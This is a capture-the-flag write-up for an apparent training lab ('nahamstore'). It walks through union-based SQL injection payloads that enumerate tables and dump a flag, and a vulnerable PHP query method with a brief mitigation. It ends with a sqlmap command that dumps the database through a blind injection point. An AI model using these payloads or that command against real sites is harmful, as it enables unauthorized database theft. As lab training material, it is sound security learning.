## Union Based SQLi:
+ In page /product, we have the potential parameter "id" --> we test with some payload: 
```
' OR 1=1 --
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
```

![](<Images/Pasted image 20250210175101.png>)

--> We can manipulate `id` to make the vulnerability SQLi and database which website'using is `MYSQL` .
+ The first we should define the numbers of columns. We use `UNION`statement: `UNION SELECT 1,2,3,...`

![](<Images/Pasted image 20250210180551.png>)

 + Next, we change the value of param "id" to find another tables. We can use `id=3`

![](<Images/Pasted image 20250210181005.png>)

+ Using `database()` to find the database of page `product` . We test `database()` for every columns until we've found the database.

![](<Images/Pasted image 20250210181313.png>)

 --> The database is "nahamstore".
 
+ We retrieve the names of all tables within a schema (database) "nahamstore" on the server:
```
3 UNION SELECT 1,2,3,GROUP_CONCAT(table_name),5 FROM information_schema.tables WHERE table_schema='nahamstore'
```
![](<Images/Pasted image 20250210181930.png>)
 --> 2 tables "product" and "sqli_one".
 
+ We retrieve the names of all columns in a table "sqli_one":
```
3 UNION SELECT 1,2,3,GROUP_CONCAT(column_name),5 FROM information_schema.columns WHERE table_name='sqli_one'
```

![](<Images/Pasted image 20250210182505.png>)
 --> 2 columns are "flag" and "id".

+ Finally, we retrieve data `flag` and `id` from a table "sqli_one":
```
3 UNION SELECT 1,2,3,GROUP_CONCAT(flag, ':' , id SEPARATOR '<br>'),5 FROM sqli_one
```

![](<Images/Pasted image 20250210183130.png>)

------------------------------------------------------------------

## Blind SQLi:

+ When we RCE and access the initial server, we can review source code and find the vulnerable SQLi in /html/models/Order.php :
```PHP
/**
     * @param $id
     * @return false|Order
     */
    public static function getInj($id){
        $resp = false;
        $d = Db::sqli2()->prepare('select * from `order` where id = '.$id);
        $d->execute();
        if( $d->rowCount() > 0 ){
            $resp = new Order( $d->fetch() );
        }
        return $resp;
    }

```

--> This method is **vulnerable to SQL injection** as it directly concatenates the `$id` parameter into the SQL query. From that we can retrieve the information in database table "sqli2".
+ Mitigation: Remove or refactor the `getInj()` method to use prepared statements.

+ Back to the website `http://nahamstore.thm/`  to test the vulnerable SQLi.
+ After we find the method has the vuln, we access deeper source code of web page. We've accessed the source code in `Website.php`:
```bash
public static function returns(){
        $error = array();
        if( isset($_POST["order_number"],$_POST["return_reason"],$_POST["return_info"]) ){
            if( !Order::getInj($_POST["order_number"]) ){
                $error[] = 'Invalid Order Number';
            }
```

--> We've found the function `return()` use the vulnerable method `getInj()`for the parameter "order_number" to check available data from the database.
+ In this case, the way to exploit the blind SQL easiest that is using tool "SqlMap".
+ First we use BurpSuite to capture the request and send it to "Repeater". We save it into file as name "request.txt".
+ Next we run `SqlMap` with command:
```bash
$ python3 sqlmap.py -r ~/request.txt --dbms=mysql -p order_number --level=4 --risk=3 --dump --threads=10
# -r: uses the intercepted request you saved earlier
# --dbms: tells SQLMap what type of database management system it is
# -p : Testable parameter(s)
# --level=LEVEL       Level of tests to perform (1-5, default 1)
# --risk=RISK         Risk of tests to perform (1-3, default 1)
# --threads
```

![](<Images/Screenshot from 2025-01-20 16-35-14.png>)

+ Waiting for tool testing and we've got the payload working

![](<Images/Screenshot from 2025-01-20 16-38-28 1.png>)

--> We are able to exploit `Boolean-based` with `OR 1=1` or `Time-based` with `OR SLEEP(5)`.
+ When testing done, we've received the result:

![](<Images/Screenshot from 2025-01-20 16-38-57.png>)

![](<Images/Screenshot from 2025-01-20 16-39-08.png>)

![](<Images/Screenshot from 2025-01-20 16-39-20.png>)

------------------------------------------------------------------

